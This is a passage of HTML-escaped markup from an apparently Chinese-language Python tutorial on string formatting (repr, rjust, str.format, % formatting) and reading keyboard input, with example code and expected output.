    &lt;span class=&#34;token keyword&#34;&gt;print&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token builtin&#34;&gt;repr&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;x&lt;span class=&#34;token operator&#34;&gt;*&lt;/span&gt;x&lt;span class=&#34;token operator&#34;&gt;*&lt;/span&gt;x&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;rjust&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;4&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;
&lt;span class=&#34;token comment&#34;&gt;# rjust() 方法, 它可以将字符串靠右, 并在左边填充空格&lt;/span&gt;
&lt;span class=&#34;token comment&#34;&gt;# zfill(), 它会在数字的左边填充 0&lt;/span&gt;

&lt;span class=&#34;token keyword&#34;&gt;for&lt;/span&gt; x &lt;span class=&#34;token keyword&#34;&gt;in&lt;/span&gt; &lt;span class=&#34;token builtin&#34;&gt;range&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;1&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;token number&#34;&gt;11&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;:&lt;/span&gt;
    &lt;span class=&#34;token keyword&#34;&gt;print&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;&#39;{0:2d} {1:3d} {2:4d}&#39;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;token builtin&#34;&gt;format&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;x&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; x&lt;span class=&#34;token operator&#34;&gt;*&lt;/span&gt;x&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; x&lt;span class=&#34;token operator&#34;&gt;*&lt;/span&gt;x&lt;span class=&#34;token operator&#34;&gt;*&lt;/span&gt;x&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;
    
&lt;span class=&#34;token triple-quoted-string string&#34;&gt;&#39;&#39;&#39;
test
&#39;test&#39;
0.14285714285714285
0.14285714285714285
test
haha
test
haha
&#39;test\nhaha&#39;
(&#39;test\nhaha&#39;, [1, 2])
 1   1    1
 2   4    8
 3   9   27
 4  16   64
 5  25  125
 6  36  216
 7  49  343
 8  64  512
 9  81  729
10 100 1000
 1   1    1
 2   4    8
 3   9   27
 4  16   64
 5  25  125
 6  36  216
 7  49  343
 8  64  512
 9  81  729
10 100 1000
&#39;&#39;&#39;&lt;/span&gt;&lt;span aria-hidden=&#34;true&#34; class=&#34;line-numbers-rows&#34;&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;

&lt;h4 id=&#34;str-format-基本使用&#34;&gt;&lt;a href=&#34;#str-format-基本使用&#34; class=&#34;headerlink&#34; title=&#34;str.format()基本使用&#34;&gt;&lt;/a&gt;str.format()基本使用&lt;/h4&gt;&lt;pre class=&#34;line-numbers language-python&#34; data-language=&#34;python&#34;&gt;&lt;code class=&#34;language-python&#34;&gt;&lt;span class=&#34;token comment&#34;&gt;# 常规输出&lt;/span&gt;
&lt;span class=&#34;token keyword&#34;&gt;print&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;&#39;{}-{}&#39;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;token builtin&#34;&gt;format&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;&#39;one&#39;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;token string&#34;&gt;&#39;two&#39;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;
&lt;span class=&#34;token comment&#34;&gt;# one-two&lt;/span&gt;

&lt;span class=&#34;token comment&#34;&gt;# 索引输入&lt;/span&gt;
&lt;span class=&#34;token keyword&#34;&gt;print&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;&#39;{1}-{0}&#39;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;token builtin&#34;&gt;format&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;&#39;one&#39;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;token string&#34;&gt;&#39;two&#39;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;
&lt;span class=&#34;token comment&#34;&gt;# two-one&lt;/span&gt;

&lt;span class=&#34;token comment&#34;&gt;# 关键字参数输出&lt;/span&gt;
&lt;span class=&#34;token keyword&#34;&gt;print&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;&#39;{name}-{age}&#39;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;token builtin&#34;&gt;format&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;age&lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;&#39;one&#39;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; name&lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;&#39;two&#39;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;
&lt;span class=&#34;token comment&#34;&gt;# two-one&lt;/span&gt;

&lt;span class=&#34;token comment&#34;&gt;# 结合&lt;/span&gt;
&lt;span class=&#34;token keyword&#34;&gt;print&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;&#39;{1}-{0}-{test}&#39;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;token builtin&#34;&gt;format&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;1&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;token number&#34;&gt;2&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; test&lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;&#39;3&#39;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;
&lt;span class=&#34;token comment&#34;&gt;# 2-1-3&lt;/span&gt;

&lt;span class=&#34;token keyword&#34;&gt;import&lt;/span&gt; math
&lt;span class=&#34;token comment&#34;&gt;# !a (使用 ascii()), !s (使用 str()) 和 !r (使用 repr())&lt;/span&gt;
&lt;span class=&#34;token keyword&#34;&gt;print&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;&#39;{!a}&#39;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;token builtin&#34;&gt;format&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;math&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;pi&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;
&lt;span class=&#34;token comment&#34;&gt;# 3.141592653589793&lt;/span&gt;

&lt;span class=&#34;token comment&#34;&gt;# :后面.加数字代表保留几位小数，和类型&lt;/span&gt;
&lt;span class=&#34;token keyword&#34;&gt;print&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;&#39;{0:.3f}。&#39;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;token builtin&#34;&gt;format&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;math&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;pi&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;
&lt;span class=&#34;token comment&#34;&gt;# 3.142。&lt;/span&gt;

&lt;span class=&#34;token comment&#34;&gt;# :后面加整数，表示证该域至少有这么多的宽度&lt;/span&gt;
table &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;token punctuation&#34;&gt;{&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;&#39;Google&#39;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;:&lt;/span&gt; &lt;span class=&#34;token number&#34;&gt;1&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;token string&#34;&gt;&#39;Runoob&#39;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;:&lt;/span&gt; &lt;span class=&#34;token number&#34;&gt;2&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;token string&#34;&gt;&#39;Taobao&#39;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;:&lt;/span&gt; &lt;span class=&#34;token number&#34;&gt;3&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;}&lt;/span&gt;
&lt;span class=&#34;token keyword&#34;&gt;for&lt;/span&gt; name&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; number &lt;span class=&#34;token keyword&#34;&gt;in&lt;/span&gt; table&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;items&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;:&lt;/span&gt;
    &lt;span class=&#34;token keyword&#34;&gt;print&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;&#39;{0:10} ==&amp;gt; {1:10d}&#39;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;token builtin&#34;&gt;format&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;name&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; number&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;
&lt;span class=&#34;token triple-quoted-string string&#34;&gt;&#39;&#39;&#39;
Google     ==&amp;gt;          1
Runoob     ==&amp;gt;          2
Taobao     ==&amp;gt;          3
&#39;&#39;&#39;&lt;/span&gt;

&lt;span class=&#34;token comment&#34;&gt;# 传入一个字典, 然后使用方括号 [] 来访问键值&lt;/span&gt;
table &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;token punctuation&#34;&gt;{&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;&#39;Google&#39;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;:&lt;/span&gt; &lt;span class=&#34;token number&#34;&gt;1&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;token string&#34;&gt;&#39;Runoob&#39;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;:&lt;/span&gt; &lt;span class=&#34;token number&#34;&gt;2&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;token string&#34;&gt;&#39;Taobao&#39;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;:&lt;/span&gt; &lt;span class=&#34;token number&#34;&gt;3&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;}&lt;/span&gt;
&lt;span class=&#34;token keyword&#34;&gt;print&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;&#39;Runoob: {0[Runoob]:d}; Google: {0[Google]:d}; Taobao: {0[Taobao]:d}&#39;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;token builtin&#34;&gt;format&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;table&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;
&lt;span class=&#34;token comment&#34;&gt;# Runoob: 2; Google: 1; Taobao: 3&lt;/span&gt;

&lt;span class=&#34;token comment&#34;&gt;# 通过在 table 变量前使用 ** 来实现相同的功能&lt;/span&gt;
table &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;token punctuation&#34;&gt;{&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;&#39;Google&#39;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;:&lt;/span&gt; &lt;span class=&#34;token number&#34;&gt;1&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;token string&#34;&gt;&#39;Runoob&#39;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;:&lt;/span&gt; &lt;span class=&#34;token number&#34;&gt;2&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;token string&#34;&gt;&#39;Taobao&#39;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;:&lt;/span&gt; &lt;span class=&#34;token number&#34;&gt;3&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;}&lt;/span&gt;
&lt;span class=&#34;token keyword&#34;&gt;print&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;&#39;Runoob: {Runoob:d}; Google: {Google:d}; Taobao: {Taobao:d}&#39;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;token builtin&#34;&gt;format&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token operator&#34;&gt;**&lt;/span&gt;table&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;
&lt;span class=&#34;token comment&#34;&gt;# Runoob: 2; Google: 1; Taobao: 3&lt;/span&gt;

&lt;span class=&#34;token triple-quoted-string string&#34;&gt;&#39;&#39;&#39;
one-two
two-one
two-one
2-1-3
3.141592653589793
3.142。
Google     ==&amp;gt;          1
Runoob     ==&amp;gt;          2
Taobao     ==&amp;gt;          3
Runoob: 2; Google: 1; Taobao: 3
Runoob: 2; Google: 1; Taobao: 3
&#39;&#39;&#39;&lt;/span&gt;&lt;span aria-hidden=&#34;true&#34; class=&#34;line-numbers-rows&#34;&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;

&lt;h3 id=&#34;旧式字符串格式化&#34;&gt;&lt;a href=&#34;#旧式字符串格式化&#34; class=&#34;headerlink&#34; title=&#34;旧式字符串格式化&#34;&gt;&lt;/a&gt;旧式字符串格式化&lt;/h3&gt;&lt;pre class=&#34;line-numbers language-python&#34; data-language=&#34;python&#34;&gt;&lt;code class=&#34;language-python&#34;&gt;&lt;span class=&#34;token keyword&#34;&gt;print&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;&#39;%5.3f&#39;&lt;/span&gt; &lt;span class=&#34;token operator&#34;&gt;%&lt;/span&gt; math&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;pi&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;

&lt;span class=&#34;token comment&#34;&gt;# 3.142&lt;/span&gt;&lt;span aria-hidden=&#34;true&#34; class=&#34;line-numbers-rows&#34;&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;

&lt;h3 id=&#34;读取键盘输入&#34;&gt;&lt;a href=&#34;#读取键盘输入&#34; class=&#34;headerlink&#34; title=&#34;读取键盘输入&#34;&gt;&lt;/a&gt;读取键盘输入&lt;/h3&gt;&lt;pre class=&#34;line-numbers language-python&#34; data-language=&#34;python&#34;&gt;&lt;code class=&#34;language-python&#34;&gt;strstr &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;token builtin&#34;&gt;input&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;&#34;请输入：&#34;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;
&lt;span class=&#34;token keyword&#34;&gt;print&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;&#34;你输入的内容是: &#34;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; strstr&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;
&lt;span class=&#34;token keyword&#34;&gt;print&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token builtin&#34;&gt;type&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;strstr&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;  &lt;span class=&#34;token comment&#34;&gt;# 传入的值都为str&lt;/span&gt;

&lt;span class=&#34;token comment&#34;&gt;# 输入三角形的三边长&lt;/span&gt;
a&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; b&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; c &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token builtin&#34;&gt;input&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;&#34;请输入三角形三边的长：&#34;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;split&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;
a &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;token builtin&#34;&gt;int&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;a&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;
b &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;token builtin&#34;&gt;int&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;b&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;
c &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;token builtin&#34;&gt;int&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;c&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;
&lt;span class=&#34;token comment&#34;&gt;# 计算三角形的半周长p&lt;/span&gt;
p &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;a &lt;span class=&#34;token operator&#34;&gt;+&lt;/span&gt; b &lt;span class=&#34;token operator&#34;&gt;+&lt;/span&gt; c&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;token operator&#34;&gt;/&lt;/span&gt; &lt;span class=&#34;token number&#34;&gt;2&lt;/span&gt;
&lt;span class=&#34;token comment&#34;&gt;# 计算三角形的面积s&lt;/span&gt;
s &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;p &lt;span class=&#34;token operator&#34;&gt;*&lt;/span&gt; &lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;p &lt;span class=&#34;token operator&#34;&gt;-&lt;/span&gt; a&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;token operator&#34;&gt;*&lt;/span&gt; &lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;p &lt;span class=&#34;token operator&#34;&gt;-&lt;/span&gt; b&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;token operator&#34;&gt;*&lt;/span&gt; &lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;p &lt;span class=&#34;token operator&#34;&gt;-&lt;/span&gt; c&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;token operator&#34;&gt;**&lt;/span&gt; &lt;span class=&#34;token number&#34;&gt;0.5&lt;/span&gt;
&lt;span class=&#34;token comment&#34;&gt;# 输出三角形的面积&lt;/span&gt;
&lt;span class=&#34;token keyword&#34;&gt;print&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;&#34;三角形面积为：&#34;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;token builtin&#34;&gt;format&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;s&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;token string&#34;&gt;&#39;.2f&#39;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;

&lt;span class=&#34;token triple-quoted-string string&#34;&gt;&#39;&#39;&#39;
请输入：9
你输入的内容是:  9
&amp;lt;class &#39;str&#39;&amp;gt;
请输入三角形三边的长：8 7 9
三角形面积为： 26.83
&#39;&#39;&#39;&lt;/span&gt;&lt;span aria-hidden=&#34;true&#34; class=&#34;line-numbers-rows&#34;&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;

